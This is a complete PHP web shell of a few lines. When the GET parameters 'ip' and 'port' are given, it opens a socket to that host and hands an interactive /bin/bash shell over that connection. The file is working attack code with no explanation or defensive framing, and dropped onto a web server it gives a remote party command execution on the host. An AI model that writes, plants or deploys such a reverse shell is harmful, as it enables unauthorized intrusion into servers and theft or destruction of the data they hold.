<?php

if ($_GET['ip'] && $_GET['port']) {
    $sock=fsockopen($_GET['ip'],$_GET['port']);
    $proc=proc_open("/bin/bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
    echo 'connecting';
} else {
    echo 'failed';
}
